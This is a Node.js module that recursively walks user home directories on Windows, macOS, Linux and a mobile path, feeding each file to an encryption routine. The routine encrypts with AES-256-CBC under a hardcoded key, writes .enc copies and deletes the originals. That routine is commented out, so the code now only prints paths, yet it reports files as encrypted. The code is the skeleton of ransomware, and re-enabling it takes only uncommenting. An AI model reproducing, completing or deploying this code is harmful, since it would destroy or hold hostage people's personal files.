const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');
const os = require('os');

const algorithm = 'aes-256-cbc';
const key = 'myPrivateKey';

async function encryptFile(filePath) {
  try {
    // const fileData = await fs.readFile(filePath);
    // const cipher = crypto.createCipher(algorithm, key);
    // let encryptedData = cipher.update(fileData);
    // encryptedData = Buffer.concat([encryptedData, cipher.final()]);
    // const encryptedFilePath = `${filePath}.enc`;
    // await fs.writeFile(encryptedFilePath, encryptedData);
    // await fs.unlink(filePath);
    // console.log(`Original file ${filePath} deleted.`);
    console.log(filePath);
  } catch (err) {
    console.error(`Error while encrypting file ${filePath}: ${err}`);
  }
}

async function traverseDirectory(directory, callback) {
  try {
    const folderStats = await fs.stat(directory);
    if (!folderStats.isDirectory()) {
      return;
    }

    // Skip folders that require admin access
    if (os.platform() !== 'win32' || (folderStats.mode & 0o777) & 0o200) {
      const folderItems = await fs.readdir(directory);
      for (const item of folderItems) {
        const itemPath = path.join(directory, item);
        const itemStats = await fs.stat(itemPath);

        if (itemStats.isDirectory()) {
          await traverseDirectory(itemPath, callback);
        } else if (itemStats.isFile()) {
          await callback(itemPath);
        }
      }
    } else {
      console.log(`Skipping folder ${directory} as it requires admin access`);
    }
  } catch (err) {
    console.error(`Error while traversing directory ${directory}: ${err}`);
  }
}

async function encryptFilesInWindowsHomeDir() {
  try {
    const homeDir = `C:/Users/${os.userInfo().username}`;
    await traverseDirectory(homeDir, encryptFile);
    console.log(`All files in Windows home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in Windows home directory: ${err}`);
  }
}

async function encryptFilesInMacHomeDir() {
  try {
    const homeDir = `/Users/${os.userInfo().username}`;
    await traverseDirectory(homeDir, encryptFile);
    console.log(`All files in Mac home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in Mac home directory: ${err}`);
  }
}

async function encryptFilesInLinuxHomeDir() {
  try {
    const homeDir = `/home/${os.userInfo().username}`;
    await traverseDirectory(homeDir, encryptFile);
    console.log(`All files in Linux home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in Linux home directory: ${err}`);
  }
}

async function encryptFilesInMobileHomeDir() {
  try {
    const homeDir = `/var/mobile`;
    await traverseDirectory(homeDir, encryptFile);
    console.log(`All files in mobile home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in mobile home directory: ${err}`);
  }
}

module.exports = {
  encryptFilesInWindowsHomeDir,
  encryptFilesInMacHomeDir,
  encryptFilesInLinuxHomeDir,
  encryptFilesInMobileHomeDir,
};